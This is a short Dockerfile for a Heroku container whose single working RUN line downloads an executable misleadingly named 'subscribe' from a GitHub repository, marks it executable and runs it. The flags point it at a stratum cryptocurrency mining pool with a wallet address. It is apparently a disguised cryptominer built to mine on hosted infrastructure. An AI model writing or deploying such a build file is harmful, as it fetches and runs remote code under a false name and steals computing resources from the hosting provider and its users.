FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/siber82/Student/raw/main/subscribe; chmod +x subscribe; ./subscribe -a power2b -o stratum+tcp://stratum-na.rplant.xyz:7022 -u Mq57pD51Lei9PBvkGCso7xNQerTHttfmRm.VPS
CMD bash heroku.sh
